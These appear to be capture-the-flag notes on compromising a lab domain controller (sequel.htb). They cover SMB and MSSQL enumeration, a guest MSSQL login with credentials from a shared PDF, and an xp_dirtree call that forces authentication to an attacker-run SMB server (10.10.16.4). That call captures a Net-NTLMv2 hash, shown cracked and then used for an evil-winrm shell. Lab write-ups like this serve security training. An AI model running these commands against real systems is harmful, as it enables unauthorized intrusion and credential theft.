# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

nmap -p 53,88,135,139,389,445,464,593,636,1433,3269,3268,5985,9389,49667,49689,49690,49715,55196 -sC -sV $IP
```

This looks very much like a Windows domain controller, based on standard Windows stuff like SMB (445), NetBIOS (135/139), LDAP (389, etc), and WinRM (5985), as well as 53 (DNS) and 88 (Kerberos) typically seen listening on DCs. There’s also a MSSQL server (1433).

### SMB
##### smbclient
```bash
smbclient -N -L \\\\$IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 

smbclient \\\\$IP\\Public -U=anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 20 00:51:25 2022
  ..                                  D        0  Sun Nov 20 00:51:25 2022
  SQL Server Procedures.pdf           A    49551  Sat Nov 19 02:39:43 2022

smbclient \\\\$IP\\Public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 20 00:51:25 2022
  ..                                  D        0  Sun Nov 20 00:51:25 2022
  SQL Server Procedures.pdf           A    49551  Sat Nov 19 02:39:43 2022

                5184255 blocks of size 4096. 1472093 blocks available
smb: \> get SQL Server Procedures.pdf 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \SQL
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (34.7 KiloBytes/sec) (average 34.7 KiloBytes/sec)
        ```

##### smbmap
```bash
smbmap -H $IP -u null -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.228.253:445      Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        ```

##### crackmapexec
```bash
crackmapexec smb $IP --shares
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

crackmapexec smb $IP --shares -u '' -p ''
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

crackmapexec smb $IP --shares -u anonymous -p ''
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: 
SMB         10.129.228.253  445    DC               [+] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```

### MSSQL
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration
* https://github.com/search?q=repo%3AA1vinSmith%2FOSCP-PWK%20MSSQL&type=code

##### sqsh
```bash
sqsh -S $IP -U PublicUser -P 'GuestUserCantWrite1'

1> select *
2> from sys.databases;
3> go
```

##### mssqlclient
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration

```bash
impacket-mssqlclient PublicUser@$IP -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sequel\Guest'

impacket-mssqlclient PublicUser@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (PublicUser  guest@master)> select @@version;
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (PublicUser  guest@master)> select user_name();
        
-----   
guest   

SQL (PublicUser  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name     
------   
master   
tempdb   
model    
msdb 
```

There’s a bunch more enumeration I could do after the point with PDF creds:

    Check DNS for zone transfer / brute force sub-domains.
    Enumerate LDAP, with and without the creds.
    Use the creds to run Bloodhound.
    Use the creds to Kerberoast.
    Brute force usernames / passwords over Kerberos.

# Shell as sql_svc
### xp_cmdshell
failed

### Get Net-NTLMv2
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack

```bash
sudo tcpdump -i tun0

impacket-smbserver as . -smb2support

SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\evil
subdirectory   depth   file   
------------   -----   ----

[*] Incoming connection (10.129.228.253,51551)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:581434152c1048c3f50698dae019f5ea:010100000000000080be6136df18da018036a36c313527ea00000000010010006f004200610058007000590058005200030010006f00420061005800700059005800520002001000560063004400470056004d006f00500004001000560063004400470056004d006f0050000700080080be6136df18da010600040002000000080030003000000000000000000000000030000025c594a40bc5fc8ef296b23ce6485673076bf40aaca49741584420d2333195830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:REGGIE1234ronnie
```

`evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie`